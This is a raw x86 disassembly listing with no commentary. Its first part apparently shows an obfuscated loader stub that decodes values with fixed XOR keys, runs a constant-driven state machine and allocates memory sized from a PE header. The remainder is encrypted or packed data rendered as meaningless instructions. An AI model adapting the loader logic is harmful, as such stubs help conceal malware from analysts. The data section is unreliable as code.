  41e1eb:	call   0x41d9e2
  41e1f0:	mov    eax,DWORD PTR [ebp-0x4]
  41e1f3:	add    eax,0x18
  41e1f6:	mov    DWORD PTR [ebp+0x18],eax
  41e1f9:	push   DWORD PTR [ebp-0x50]
  41e1fc:	push   DWORD PTR [ebp+0x18]
  41e1ff:	mov    eax,DWORD PTR [ebp-0x54]
  41e202:	add    eax,DWORD PTR [ebp-0x20]
  41e205:	push   eax
  41e206:	call   0x41d455
  41e20b:	mov    eax,DWORD PTR [ebp+0x8]
  41e20e:	mov    ecx,DWORD PTR [ebp-0x18]
  41e211:	xor    eax,edi
  41e213:	add    eax,ebx
  41e215:	cmp    eax,ecx
  41e217:	je     0x41e22a
  41e219:	push   0x0
  41e21b:	push   DWORD PTR [ebp-0x50]
  41e21e:	mov    eax,DWORD PTR [ebp-0x54]
  41e221:	add    eax,DWORD PTR [ebp-0x20]
  41e224:	push   eax
  41e225:	call   0x41d9e2
  41e22a:	mov    eax,DWORD PTR [ebp-0x24]
  41e22d:	mov    ecx,DWORD PTR [ebp-0x50]
  41e230:	add    DWORD PTR [eax],ecx
  41e232:	mov    eax,DWORD PTR [ebp-0x50]
  41e235:	add    eax,DWORD PTR [ebp+0x1c]
  41e238:	mov    DWORD PTR [ebp+0x1c],eax
  41e23b:	mov    eax,DWORD PTR [ebp-0x8]
  41e23e:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e241:	xor    eax,edi
  41e243:	add    eax,ebx
  41e245:	imul   eax,ecx
  41e248:	mov    ecx,DWORD PTR [ebp+0x8]
  41e24b:	mov    edx,DWORD PTR [ebp-0x28]
  41e24e:	xor    ecx,edi
  41e250:	lea    ecx,[ecx+edx*1+0x3272e0]
  41e257:	cmp    eax,ecx
  41e259:	jb     0x41deb7
  41e25f:	mov    esi,DWORD PTR [ebp+0x14]
  41e262:	mov    eax,DWORD PTR [ebp-0x20]
  41e265:	mov    DWORD PTR [esi],eax
  41e267:	jmp    0x41e2ae
  41e269:	mov    ecx,DWORD PTR [ebp+0x8]
  41e26c:	mov    edx,DWORD PTR [ebp+0xc]
  41e26f:	xor    ecx,edi
  41e271:	xor    edx,edi
  41e273:	add    ecx,ebx
  41e275:	add    edx,ebx
  41e277:	cmp    ecx,edx
  41e279:	jne    0x41e28d
  41e27b:	mov    eax,ds:0x7f642d1e
  41e280:	imul   eax,eax,0x9f15fcef
  41e286:	mov    ds:0x7f642d1e,eax
  41e28b:	jmp    0x41e2ae
  41e28d:	mov    ecx,DWORD PTR [ebp+0x8]
  41e290:	xor    ecx,edi
  41e292:	add    ecx,ebx
  41e294:	cmp    eax,ecx
  41e296:	je     0x41e2a4
  41e298:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  41e2a2:	jmp    0x41e2ae
  41e2a4:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  41e2ae:	pop    edi
  41e2af:	pop    esi
  41e2b0:	pop    ebx
  41e2b1:	leave  
  41e2b2:	ret    0x18
  41e2b5:	push   ebp
  41e2b6:	mov    ebp,esp
  41e2b8:	and    esp,0xfffffff8
  41e2bb:	mov    eax,DWORD PTR [ebp+0x20]
  41e2be:	sub    esp,0x14
  41e2c1:	push   ebx
  41e2c2:	mov    ebx,DWORD PTR [ebp+0x14]
  41e2c5:	push   esi
  41e2c6:	push   edi
  41e2c7:	cmp    eax,0xf89c85b9
  41e2cc:	jne    0x41e2d8
  41e2ce:	push   0xf89c85b8
  41e2d3:	jmp    0x41e40a
  41e2d8:	mov    eax,DWORD PTR [ebp+0x20]
  41e2db:	cmp    eax,0xf89c85b8
  41e2e0:	jne    0x41e2ec
  41e2e2:	push   0xf89c85bb
  41e2e7:	jmp    0x41e40a
  41e2ec:	mov    eax,DWORD PTR [ebp+0x20]
  41e2ef:	cmp    eax,0xf89c85bb
  41e2f4:	jne    0x41e300
  41e2f6:	push   0xf89c85ba
  41e2fb:	jmp    0x41e40a
  41e300:	mov    eax,DWORD PTR [ebp+0x20]
  41e303:	cmp    eax,0xf89c85ba
  41e308:	jne    0x41e314
  41e30a:	push   0xf89c85bd
  41e30f:	jmp    0x41e40a
  41e314:	mov    ecx,DWORD PTR [ebp+0x20]
  41e317:	mov    eax,0xf89c85be
  41e31c:	cmp    ecx,eax
  41e31e:	jne    0x41e3da
  41e324:	mov    eax,DWORD PTR [ebp+0x10]
  41e327:	mov    DWORD PTR [esp+0xc],eax
  41e32b:	mov    eax,DWORD PTR [ebp+0x18]
  41e32e:	mov    DWORD PTR [esp+0x14],eax
  41e332:	mov    eax,DWORD PTR [ebp+0xc]
  41e335:	mov    DWORD PTR [esp+0x18],eax
  41e339:	mov    eax,DWORD PTR [ebp+0x8]
  41e33c:	mov    DWORD PTR [esp+0x10],eax
  41e340:	mov    eax,DWORD PTR [esp+0x10]
  41e344:	mov    ecx,DWORD PTR [esp+0x14]
  41e348:	mov    edi,0x7510899
  41e34d:	xor    eax,edi
  41e34f:	mov    esi,0x3272e0
  41e354:	add    eax,esi
  41e356:	mov    DWORD PTR [ecx],eax
  41e358:	mov    eax,DWORD PTR [esp+0xc]
  41e35c:	mov    eax,DWORD PTR [eax+0x194]
  41e362:	mov    ecx,DWORD PTR [eax]
  41e364:	mov    eax,DWORD PTR [esp+0xc]
  41e368:	mov    eax,DWORD PTR [eax+0x194]
  41e36e:	mov    eax,DWORD PTR [eax]
  41e370:	add    eax,DWORD PTR [ecx+0x3c]
  41e373:	mov    ecx,DWORD PTR [esp+0xc]
  41e377:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41e37d:	mov    ecx,DWORD PTR [ecx+0x14]
  41e380:	push   0x4
  41e382:	push   0x3000
  41e387:	push   DWORD PTR [eax+0x50]
  41e38a:	push   0x0
  41e38c:	call   ecx
  41e38e:	mov    DWORD PTR [ebx],eax
  41e390:	mov    eax,DWORD PTR [esp+0x10]
  41e394:	push   DWORD PTR [esp+0xc]
  41e398:	xor    eax,edi
  41e39a:	add    eax,esi
  41e39c:	mov    DWORD PTR [esp+0x20],eax
  41e3a0:	lea    eax,[esp+0x20]
  41e3a4:	push   eax
  41e3a5:	push   ebx
  41e3a6:	push   DWORD PTR [esp+0x20]
  41e3aa:	push   DWORD PTR [esp+0x28]
  41e3ae:	push   DWORD PTR [esp+0x24]
  41e3b2:	call   0x41dd77
  41e3b7:	mov    eax,DWORD PTR [esp+0x10]
  41e3bb:	mov    ecx,DWORD PTR [ebx]
  41e3bd:	xor    eax,edi
  41e3bf:	add    eax,esi
  41e3c1:	cmp    ecx,eax
  41e3c3:	je     0x41e421
  41e3c5:	mov    eax,DWORD PTR [esp+0x18]
  41e3c9:	mov    ecx,DWORD PTR [esp+0x14]
  41e3cd:	xor    eax,edi
  41e3cf:	add    eax,esi
  41e3d1:	imul   eax,DWORD PTR [esp+0x1c]
  41e3d6:	mov    DWORD PTR [ecx],eax
  41e3d8:	jmp    0x41e421
  41e3da:	mov    ecx,DWORD PTR [ebp+0x20]
  41e3dd:	cmp    ecx,0xf89c85bd
  41e3e3:	jne    0x41e3ec
  41e3e5:	push   0xf89c85bc
  41e3ea:	jmp    0x41e40a
  41e3ec:	mov    ecx,DWORD PTR [ebp+0x20]
  41e3ef:	cmp    ecx,0xf89c85bc
  41e3f5:	jne    0x41e3fe
  41e3f7:	push   0xf89c85bf
  41e3fc:	jmp    0x41e40a
  41e3fe:	mov    ecx,DWORD PTR [ebp+0x20]
  41e401:	cmp    ecx,0xf89c85bf
  41e407:	jne    0x41e421
  41e409:	push   eax
  41e40a:	push   DWORD PTR [ebp+0x1c]
  41e40d:	push   DWORD PTR [ebp+0x18]
  41e410:	push   ebx
  41e411:	push   DWORD PTR [ebp+0x10]
  41e414:	push   DWORD PTR [ebp+0xc]
  41e417:	push   DWORD PTR [ebp+0x8]
  41e41a:	call   0x41e2b5
  41e41f:	mov    DWORD PTR [ebx],eax
  41e421:	mov    eax,DWORD PTR [ebx]
  41e423:	pop    edi
  41e424:	pop    esi
  41e425:	pop    ebx
  41e426:	mov    esp,ebp
  41e428:	pop    ebp
  41e429:	ret    0x1c
  41e42c:	push   ebp
  41e42d:	mov    ebp,esp
  41e42f:	sub    esp,0xc
  41e432:	mov    eax,0xf89c85b9
  41e437:	mov    DWORD PTR [ebp-0x8],eax
  41e43a:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  41e441:	mov    ecx,DWORD PTR [ebp-0x8]
  41e444:	xor    ecx,0x7510899
  41e44a:	add    ecx,0x3272e0
  41e450:	mov    DWORD PTR [ebp-0x4],ecx
  41e453:	mov    ecx,DWORD PTR [ebp+0xc]
  41e456:	push   eax
  41e457:	mov    DWORD PTR [ebp+0xc],ecx
  41e45a:	push   DWORD PTR [ebp+0xc]
  41e45d:	lea    eax,[ebp-0x4]
  41e460:	push   DWORD PTR [ebp+0x8]
  41e463:	push   eax
  41e464:	push   DWORD PTR [ebp+0xc]
  41e467:	push   DWORD PTR [ebp-0xc]
  41e46a:	push   DWORD PTR [ebp-0x8]
  41e46d:	call   0x41e2b5
  41e472:	mov    DWORD PTR [ebp-0x4],eax
  41e475:	mov    eax,DWORD PTR [ebp-0x4]
  41e478:	leave  
  41e479:	ret    0x8
  41e47c:	jg     0x41e432
  41e47e:	jge    0xf741a453
  41e484:	xor    BYTE PTR [ebp-0x2a726e92],0x73
  41e48b:	sar    al,0x61
  41e48e:	add    DWORD PTR [eax],eax
  41e490:	test   DWORD PTR [edx],eax
  41e492:	add    BYTE PTR [eax],al
  41e494:	add    esi,edi
  41e496:	or     al,0x4
  41e498:	or     al,0x92
  41e49a:	and    eax,0x4d1cd1a1
  41e49f:	shl    BYTE PTR [edx-0x6c],0x92
  41e4a3:	adc    eax,DWORD PTR [ebp+0x0]
  41e4a6:	jp     0x41e49b
  41e4a8:	jne    0x41e448
  41e4aa:	dec    esi
  41e4ab:	sar    BYTE PTR [ebx-0x8],cl
  41e4ae:	es dec ebx
  41e4b0:	imul   ebp,DWORD PTR [ecx],0x4a
  41e4b3:	aas    
  41e4b4:	jb     0x41e4ec
  41e4b6:	jns    0x41e4ad
  41e4b8:	cmp    ch,BYTE PTR [ecx-0x55905382]
  41e4be:	add    BYTE PTR [edi+ecx*8],ah
  41e4c1:	cdq    
  41e4c2:	dec    DWORD PTR [ebp-0x7782eac2]
  41e4c8:	std    
  41e4c9:	pop    es
  41e4ca:	inc    edi
  41e4cb:	stos   BYTE PTR es:[edi],al
  41e4cc:	jno    0x41e488
  41e4ce:	in     eax,dx
  41e4cf:	mov    esp,0xdb2e2802
  41e4d4:	mov    dl,0x48
  41e4d6:	and    ah,BYTE PTR [eax]
  41e4d8:	add    ebp,DWORD PTR [edi]
  41e4da:	cmp    eax,0x5961d29d
  41e4df:	or     edi,edx
  41e4e1:	ins    DWORD PTR es:[edi],dx
  41e4e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4e3:	pushf  
  41e4e4:	mov    eax,DWORD PTR [eax+0x6e]
  41e4e7:	jmp    0x4db6:0xdc9df8b3
  41e4ee:	es xchg ecx,eax
  41e4f0:	inc    ecx
  41e4f1:	inc    esi
  41e4f2:	adc    al,0xdf
  41e4f4:	enter  0x354c,0x62
  41e4f8:	lods   al,BYTE PTR ds:[esi]
  41e4f9:	push   es
  41e4fa:	hlt    
  41e4fb:	jle    0x41e54c
  41e4fd:	fwait
  41e4fe:	aaa    
  41e4ff:	stos   DWORD PTR es:[edi],eax
  41e500:	or     bh,BYTE PTR [ebx]
  41e502:	dec    edi
  41e503:	mov    ebp,0x78176386
  41e508:	fstp   QWORD PTR [edx-0xc]
  41e50b:	mov    ebp,0xc3cb6f28
  41e510:	jp     0x41e591
  41e512:	(bad)  
  41e513:	cmp    cl,BYTE PTR [ebp-0x20]
  41e516:	pop    eax
  41e517:	lea    esi,[ebx+eax*1-0x10]
  41e51b:	xchg   BYTE PTR [edi-0x3b],bh
  41e51e:	fistp  WORD PTR [edx-0x29]
  41e521:	dec    esi
  41e522:	dec    ebp
  41e523:	sub    ebx,DWORD PTR [edi-0x7]
  41e526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e527:	xor    BYTE PTR [ebp-0x28],bh
  41e52a:	mov    bh,BYTE PTR [edi-0x25f92b9d]
  41e530:	mov    WORD PTR ss:[ebp+0xdd7aad1],?
  41e537:	fldenv [ebx]
  41e539:	dec    ebp
  41e53a:	das    
  41e53b:	dec    edi
  41e53c:	or     al,0x25
  41e53e:	jmp    0x49545f6e
  41e543:	data16 add bh,BYTE PTR [edi+0x7c84b508]
  41e54a:	push   edi
  41e54b:	test   ebx,ebp
  41e54d:	and    BYTE PTR [edx],ch
  41e54f:	jg     0x41e52f
  41e551:	test   DWORD PTR [edi+0x53],ebp
  41e554:	fimul  DWORD PTR [esi-0x10]
  41e557:	inc    ecx
  41e558:	add    BYTE PTR ds:0x41aa1d9b,ah
  41e55e:	mov    edx,0x961a3968
  41e563:	into   
  41e564:	adc    eax,0x15dded3d
  41e569:	test   al,0x71
  41e56b:	fwait
  41e56c:	dec    esp
  41e56d:	repz call 0xf1ff:0x13a3cd7e
  41e575:	mov    ecx,esi
  41e577:	retf   
  41e578:	inc    esi
  41e579:	arpl   bp,si
  41e57b:	js     0x41e5e9
  41e57d:	gs dec eax
  41e57f:	jae    0x41e585
  41e581:	sub    bl,BYTE PTR [edi]
  41e583:	(bad)  
  41e584:	in     al,dx
  41e585:	xor    BYTE PTR [edx],dl
  41e587:	daa    
  41e588:	jp     0x41e5c7
  41e58a:	out    0x10,eax
  41e58c:	xor    DWORD PTR [edx],esi
  41e58e:	and    BYTE PTR [ecx],dh
  41e590:	sbb    DWORD PTR [ecx-0x65],esi
  41e593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e594:	add    esp,DWORD PTR [esi]
  41e596:	mov    ds:0x2f6a4cc7,al
  41e59b:	arpl   WORD PTR [ebx-0x734017ad],sp
  41e5a1:	retf   0x720e
  41e5a4:	rcr    BYTE PTR [ecx+0x31],cl
  41e5a7:	dec    ebx
  41e5a8:	sahf   
  41e5a9:	(bad)  
  41e5aa:	sbb    eax,0xc4538e40
  41e5af:	dec    ebp
  41e5b0:	dec    edx
  41e5b1:	ja     0x41e620
  41e5b3:	push   edi
  41e5b4:	lahf   
  41e5b5:	leave  
  41e5b6:	dec    esi
  41e5b7:	cmc    
  41e5b8:	push   0xffffffdd
  41e5ba:	adc    bl,dl
  41e5bc:	and    al,0xf8
  41e5be:	add    eax,0x1047c388
  41e5c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5c4:	add    eax,0xf51e5578
  41e5c9:	inc    ecx
  41e5ca:	push   edx
  41e5cb:	out    dx,eax
  41e5cc:	xor    ecx,ebx
  41e5ce:	int3   
  41e5cf:	dec    edx
  41e5d0:	ja     0x41e5f9
  41e5d2:	push   ds
  41e5d3:	or     al,0xdc
  41e5d6:	(bad)  
  41e5d7:	sar    esp,1
  41e5d9:	xchg   ebx,eax
  41e5da:	(bad)  
  41e5db:	arpl   WORD PTR [ecx],bx
  41e5dd:	icebp  
  41e5de:	xchg   edx,eax
  41e5df:	push   esi
  41e5e0:	xchg   esp,eax
  41e5e1:	cmp    eax,0x3eb81ec3
  41e5e6:	adc    ecx,DWORD PTR [ebx+0x1e2865ad]
  41e5ec:	mov    WORD PTR [ebx-0x231adfae],ss
  41e5f2:	rcr    ebp,0x31
  41e5f5:	xchg   esp,eax
  41e5f6:	jle    0x41e635
  41e5f8:	rol    DWORD PTR [ebx],0xe2
  41e5fb:	cs es push eax
  41e5fe:	aam    0x5c
  41e600:	jmp    0x460ca3e2
  41e605:	inc    edi
  41e606:	xchg   ebx,eax
  41e607:	xor    esi,DWORD PTR [ecx-0x5cf2889]
  41e60d:	inc    edi
  41e60e:	cmp    ah,BYTE PTR [ebx+ebx*8-0x13]
  41e612:	scas   al,BYTE PTR es:[edi]
  41e613:	sub    DWORD PTR [eax],esi
  41e615:	mov    ch,0x6a
  41e617:	push   ds
  41e618:	and    al,0xf5
  41e61a:	mov    cl,0x6a
  41e61d:	sti    
  41e61e:	adc    eax,0xf25dfb42
  41e623:	(bad)  ds:0xbc11d777
  41e629:	dec    esp
  41e62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e62b:	jge    0x41e5c1
  41e62d:	fidivr DWORD PTR [edx]
  41e62f:	inc    esp
  41e630:	xchg   edx,eax
  41e631:	(bad)  
  41e632:	jae    0x41e689
  41e634:	mov    bh,0x26
  41e636:	js     0x41e64e
  41e638:	jge    0x41e648
  41e63a:	sbb    al,0x3d
  41e63c:	aam    0x62
  41e63e:	sbb    BYTE PTR [eax+ebx*8],0xb3
  41e642:	sub    eax,ebx
  41e644:	mov    ch,0x10
  41e646:	mov    eax,0x2a56ba47
  41e64b:	(bad)  
  41e64c:	int3   
  41e64d:	shl    DWORD PTR [edx],0x87
  41e650:	lods   eax,DWORD PTR ds:[esi]
  41e651:	dec    ebx
  41e652:	lock hlt 
  41e654:	mov    esp,0x51798cb3
  41e659:	jmp    0x41e695
  41e65b:	adc    bl,BYTE PTR [ebx+esi*1+0x4c]
  41e65f:	or     DWORD PTR [eax],ecx
  41e661:	add    BYTE PTR [eax+0x5a],0x95
  41e665:	aam    0x39
  41e667:	jl     0x41e6e5
  41e669:	jnp    0x41e6c0
  41e66b:	jmp    0x41e64c
  41e66d:	mov    cl,0xbc
  41e66f:	verr   bx
  41e672:	xor    BYTE PTR [ebx+0x76dc2279],ch
  41e678:	fsubr  DWORD PTR [ebp+0x1971ad4e]
  41e67e:	shr    BYTE PTR [edx],0x42
  41e681:	sub    al,0x2e
  41e683:	rol    DWORD PTR [esp+eax*4+0x64],1
  41e687:	dec    edi
  41e688:	pusha  
  41e689:	pop    esp
  41e68a:	ldmxcsr DWORD PTR [ebx]
  41e68d:	cmp    ebx,DWORD PTR [edi+0x2d]
  41e690:	xor    DWORD PTR [edx],esi
  41e692:	pop    esi
  41e693:	pop    eax
  41e694:	rcl    DWORD PTR [ecx+0x510047d],1
  41e69a:	imul   ebp,DWORD PTR [ebp+eiz*4+0x4fa3e9bf],0xe63d46f0
  41e6a5:	repnz gs push esp
  41e6a8:	pop    ds
  41e6a9:	pop    DWORD PTR [esi]
  41e6ab:	test   al,0xb8
  41e6ad:	(bad)  
  41e6af:	rcr    al,cl
  41e6b1:	and    al,0xe1
  41e6b3:	out    0xee,al
  41e6b5:	ja     0x41e6cd
  41e6b7:	sub    DWORD PTR [eax],eax
  41e6b9:	adc    edx,DWORD PTR [edx+0x5a8b8bf6]
  41e6bf:	jmp    0x4556:0x5e5f5855
  41e6c6:	jp     0x41e686
  41e6c8:	cmp    DWORD PTR gs:[esi+0x68],esi
  41e6cc:	aad    0x94
  41e6ce:	enter  0x74da,0xec
  41e6d2:	cmp    al,BYTE PTR [ecx]
  41e6d4:	xor    ah,BYTE PTR [edx*8+0x3f1cad7a]
  41e6db:	dec    edx
  41e6dc:	and    DWORD PTR [edx],eax
  41e6de:	bound  ebp,QWORD PTR [ebx+eiz*4+0x48]
  41e6e2:	push   cs
  41e6e3:	inc    esp
  41e6e4:	mov    bh,0xf3
  41e6e6:	add    al,0x8a
  41e6e8:	nop
  41e6e9:	cwde   
  41e6ea:	adc    DWORD PTR [edx],edi
  41e6ec:	jecxz  0x41e6bc
  41e6ee:	in     eax,0x3b
  41e6f0:	ret    
  41e6f1:	cmp    eax,DWORD PTR [ebx-0x511a27f]
  41e6f7:	cmp    eax,0x439a464
  41e6fc:	adc    eax,DWORD PTR [ecx]
  41e6fe:	retf   
  41e6ff:	push   ebx
  41e700:	adc    DWORD PTR [edi],edi
  41e702:	mov    ah,0x7
  41e704:	adc    edi,esp
  41e706:	sub    eax,0xf37a9db2
  41e70b:	jg     0x41e6c6
  41e70d:	or     BYTE PTR [esi+0x6e],ch
  41e710:	dec    ecx
  41e711:	add    bl,BYTE PTR [edi]
  41e713:	dec    eax
  41e714:	add    eax,0xa79e693d
  41e719:	add    BYTE PTR [eax],al
  41e71b:	add    BYTE PTR [edi+0x4c],dh
  41e71e:	idiv   dh
  41e720:	(bad)  
  41e721:	(bad)  
  41e722:	jg     0x41e6f1
  41e724:	mov    ah,0x6b
  41e726:	mov    dh,0x14
  41e728:	(bad)  
  41e72a:	fdiv   st,st(4)
  41e72c:	jge    0x41e792
  41e72e:	add    DWORD PTR [eax],eax
  41e730:	test   DWORD PTR [edx],eax
  41e732:	add    BYTE PTR [eax],al
  41e734:	aam    0x13
  41e736:	test   eax,0xf1bc7f39
  41e73b:	jb     0x41e72c
  41e73d:	cmp    ch,al
  41e73f:	clc    
  41e740:	stos   BYTE PTR es:[edi],al
  41e741:	(bad)  
  41e742:	sbb    DWORD PTR [eax-0x6d],ebp
  41e745:	iret   
  41e746:	inc    esp
  41e747:	sub    DWORD PTR [ebp+0xf],ecx
  41e74a:	sub    BYTE PTR [ebp+0x4dbd4cbd],0xf0
  41e751:	jp     0x41e747
  41e753:	or     al,0xd4
  41e755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e756:	stos   BYTE PTR es:[edi],al
  41e757:	dec    ebx
  41e758:	sbb    ch,BYTE PTR [esi+eiz*2+0x3f5a554f]
  41e75f:	cwde   
  41e760:	mov    WORD PTR [esi+0x30],ds
  41e763:	sti    
  41e764:	test   eax,0xbb9cd206
  41e769:	or     eax,0x90545dca
  41e76e:	das    
  41e76f:	imul   ebp,DWORD PTR [eax-0x16],0xffffffea
  41e773:	push   ds
  41e774:	jecxz  0x41e74f
  41e776:	xchg   DWORD PTR [esi+0x50e62164],ebp
  41e77c:	jmp    FWORD PTR [edi]
  41e77e:	fcos   
  41e780:	ds mov ebp,0xb4e265e4
  41e786:	xor    BYTE PTR [edi],cl
  41e788:	scas   al,BYTE PTR es:[edi]
  41e789:	adc    al,0x79
  41e78b:	lock fmul DWORD PTR [esi+0x51]
  41e78f:	mov    DWORD PTR [edi+0x6f],ecx
  41e792:	xor    al,0x7e
  41e794:	popf   
  41e795:	(bad)  
  41e797:	icebp  
  41e798:	dec    edi
  41e799:	stc    
  41e79a:	add    al,0x51
  41e79c:	cmp    ch,0x98
  41e79f:	cmp    al,0x99
  41e7a1:	sub    edx,esp
  41e7a3:	pusha  
  41e7a4:	add    al,0xc0
  41e7a6:	add    DWORD PTR [edi+edi*1+0x2e4c2b8c],edi
  41e7ad:	or     ah,BYTE PTR [edx-0x742a564c]
  41e7b3:	adc    eax,0x19c96150
  41e7b8:	imul   BYTE PTR [ecx+edx*8+0x28]
  41e7bc:	dec    esp
  41e7bd:	fdivp  st(1),st
  41e7bf:	fisttp DWORD PTR [ecx+0x29]
  41e7c2:	bound  ebp,QWORD PTR [ebx+0x5e0adb34]
  41e7c8:	fcmovb st,st(7)
  41e7ca:	popf   
  41e7cb:	aad    0x85
  41e7cd:	dec    esp
  41e7ce:	jge    0x41e7f0
  41e7d0:	cli    
  41e7d1:	popa   
  41e7d2:	mov    bh,BYTE PTR [ebx-0x22]
  41e7d5:	jmp    0x8f0a:0xf172
  41e7db:	jmp    0x41e778
  41e7dd:	cmp    eax,0xbb8766fa
  41e7e2:	mov    ch,BYTE PTR ss:[esi]
  41e7e5:	clc    
  41e7e6:	pop    ss
  41e7e7:	clc    
  41e7e8:	loope  0x41e7e3
  41e7ea:	adc    dh,BYTE PTR [edi-0x2391cc79]
  41e7f0:	fimul  DWORD PTR [ecx-0x790a36cf]
  41e7f6:	jge    0x41e82c
  41e7f8:	inc    eax
  41e7f9:	test   al,0x7b
  41e7fb:	push   ds
  41e7fc:	xor    eax,0x9bb89830
  41e801:	(bad)  
  41e802:	outs   dx,DWORD PTR ds:[esi]
  41e803:	stc    
  41e804:	add    al,BYTE PTR [ebx]
  41e806:	cmp    eax,0x3b48d152
  41e80b:	das    
  41e80c:	arpl   WORD PTR [edx-0x4d987088],sp
  41e812:	inc    eax
  41e813:	sub    BYTE PTR ds:0x5316c210,ah
  41e819:	push   ss
  41e81a:	or     DWORD PTR [esi+0x25846f55],eax
  41e820:	jl     0x41e820
  41e822:	adc    eax,0x7d467952
  41e827:	pop    ds
  41e828:	cmp    edi,eax
  41e82a:	call   0x88b0:0x4c9bbab4
  41e831:	popf   
  41e832:	sub    eax,0x2f9ef5f6
  41e837:	and    dl,BYTE PTR [ebx-0x57cf89ed]
  41e83d:	stos   BYTE PTR es:[edi],al
  41e83e:	dec    dx
  41e840:	jnp    0x41e8bf
  41e842:	xor    al,0xaa
  41e844:	inc    esi
  41e845:	pop    esi
  41e846:	push   ecx
  41e847:	cmp    BYTE PTR [ebp+0x5d],dl
  41e84a:	enter  0x9f3d,0xe5
  41e84e:	cmp    al,0xd5
  41e850:	loope  0x41e85c
  41e852:	mov    ebp,0xf290d066
  41e857:	jmp    0xa6ede375
  41e85c:	jb     0x41e866
  41e85e:	mov    al,0xfd
  41e860:	retf   0xb72b
  41e863:	int    0xd2
  41e865:	and    BYTE PTR [edi+edi*2],ch
  41e868:	sar    DWORD PTR [edx-0x4ad2e53a],0xcd
  41e86f:	clc    
  41e870:	repz pop edi
  41e872:	clc    
  41e873:	push   esp
  41e874:	ja     0x41e8b2
  41e876:	adc    eax,0xc0500c99
  41e87b:	push   es
  41e87c:	mov    edi,?
  41e87e:	bound  esi,QWORD PTR [esp+esi*4]
  41e881:	out    0x3a,eax
  41e883:	sub    ecx,DWORD PTR [edx*8-0x154370be]
  41e88a:	xchg   esi,eax
  41e88b:	add    ch,BYTE PTR ds:0xb8109518
  41e891:	adc    al,0xc
  41e893:	jmp    0x6690:0x39e87b24
  41e89a:	pop    ebp
  41e89b:	in     al,0xa0
  41e89d:	mov    ebp,0xbd5e64a2
  41e8a2:	loop   0x41e853
  41e8a4:	cld    
  41e8a5:	pop    ecx
  41e8a6:	pop    ebx
  41e8a7:	mov    DWORD PTR [esi+ecx*1],esi
  41e8aa:	aaa    
  41e8ab:	fdivrp st(3),st
  41e8ad:	sub    BYTE PTR [ebx],ah
  41e8af:	or     edx,DWORD PTR [edx]
  41e8b1:	or     cl,BYTE PTR [edi]
  41e8b3:	test   al,0x82
  41e8b5:	lds    esp,FWORD PTR [edx-0x29]
  41e8b8:	mov    edi,0x68325c81
  41e8bd:	xor    cl,BYTE PTR [esi-0x47f01ef7]
  41e8c3:	xchg   ecx,eax
  41e8c4:	and    DWORD PTR [ebx+0x1e],eax
  41e8c7:	loope  0x41e8bd
  41e8c9:	retf   
  41e8ca:	and    eax,0x548f8c34
  41e8cf:	fisttp QWORD PTR [edx+0x161e5a62]
  41e8d5:	mov    al,ds:0x639884e0
  41e8da:	je     0x41e947
  41e8dc:	cmp    eax,0xb50de0a5
  41e8e1:	mov    esi,0xc6485998
  41e8e6:	ret    
  41e8e7:	jbe    0x41e89e
  41e8e9:	out    dx,eax
  41e8ea:	mov    BYTE PTR [edx],dl
  41e8ec:	pop    ecx
  41e8ed:	test   BYTE PTR [eax+0x3c79a066],cl
  41e8f3:	(bad)  
  41e8f4:	fidiv  WORD PTR [esi]
  41e8f6:	add    al,0xe
  41e8f8:	add    cl,BYTE PTR [ebx]
  41e8fa:	fwait
  41e8fb:	jecxz  0x41e8f9
  41e8fd:	pop    ds
  41e8fe:	mov    bh,0x34
  41e900:	call   0xeb8a2ed3
  41e905:	adc    eax,0x8bda0c61
  41e90a:	sbb    BYTE PTR [eax-0xa],dl
  41e90d:	fdivr  DWORD PTR [edi+0x63fd0d8d]
  41e913:	sbb    al,0x6b
  41e915:	lods   al,BYTE PTR ds:[esi]
  41e916:	pop    eax
  41e917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e918:	fstp   DWORD PTR [edi+0x20]
  41e91b:	mov    DWORD PTR ds:0x408c35ca,esp
  41e921:	jle    0x41e8c8
  41e923:	(bad)  
  41e925:	and    ch,dl
  41e927:	or     DWORD PTR [eax+0x30],ebx
  41e92a:	enter  0x946c,0x7d
  41e92e:	(bad)  
  41e92f:	leave  
  41e930:	aas    
  41e931:	call   0x3cb9:0x5e6454a0
  41e938:	push   0x10
  41e93a:	in     al,0xed
  41e93c:	adc    al,0x82
  41e93e:	aaa    
  41e93f:	in     al,0xc3
  41e941:	xor    BYTE PTR [eax+edi*8-0x19603641],ch
  41e948:	jge    0x41e8f8
  41e94a:	test   al,0x78
  41e94c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e94d:	mov    esi,0x25af45de
  41e952:	and    eax,0xf73e6c79
  41e957:	ret    0x6a12
  41e95a:	pop    ebx
  41e95b:	cmp    esi,edi
  41e95d:	xchg   ebx,eax
  41e95e:	icebp  
  41e95f:	outs   dx,DWORD PTR ds:[esi]
  41e960:	cmp    DWORD PTR [ebx],edx
  41e962:	fwait
  41e963:	mov    ebx,0x4deb3999
  41e968:	dec    ecx
  41e969:	clc    
  41e96a:	daa    
  41e96b:	les    ebp,FWORD PTR [eax]
  41e96d:	inc    edx
  41e96e:	in     eax,0x1c
  41e970:	retf   
  41e971:	push   0x61c7ad0b
  41e976:	mov    dh,0x2a
  41e978:	mov    ecx,0x888002df
  41e97d:	addr16 daa 
  41e97f:	sub    al,0x5a
  41e981:	popa   
  41e982:	(bad)  
  41e983:	inc    ebx
  41e984:	fld    DWORD PTR [eax]
  41e986:	test   eax,0x59122e34
  41e98b:	sub    DWORD PTR ss:[esi],esi
  41e98e:	scas   eax,DWORD PTR es:[edi]
  41e98f:	xchg   ecx,eax
  41e990:	jno    0x41e962
  41e992:	jo     0x41e999
  41e994:	sub    eax,ebx
  41e996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e997:	(bad)  
  41e998:	in     eax,0x9c
  41e99a:	mov    esi,0x2727eecf
  41e99f:	push   ss
